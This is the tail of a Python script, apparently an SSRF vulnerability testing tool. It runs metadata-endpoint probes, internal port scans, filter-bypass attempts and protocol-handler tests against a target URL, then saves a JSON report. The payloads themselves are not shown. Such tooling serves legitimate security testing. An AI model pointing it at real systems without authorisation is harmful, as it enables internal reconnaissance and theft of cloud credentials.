        "internal_port_scan": port_scan,
        "bypass_techniques": bypass_results,
        "protocol_handlers": protocol_results,
        "vulnerabilities_found": len(critical),
    }
    print(f"SSRF REPORT: {len(critical)} vulnerabilities found")
    return report


def main():
    parser = argparse.ArgumentParser(description="SSRF Vulnerability Testing Agent")
    parser.add_argument("--target-url", required=True, help="Target URL with SSRF parameter (e.g. https://app/fetch?url=)")
    parser.add_argument("--internal-ip", default="127.0.0.1", help="Internal IP for port scan")
    parser.add_argument("--output", default="ssrf_report.json")
    args = parser.parse_args()

    metadata = test_metadata_endpoints(args.target_url)
    ports = test_internal_port_scan(args.target_url, args.internal_ip)
    bypasses = test_bypass_techniques(args.target_url)
    protocols = test_protocol_handlers(args.target_url)

    report = generate_report(metadata, ports, bypasses, protocols)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()

===== END FILE =====
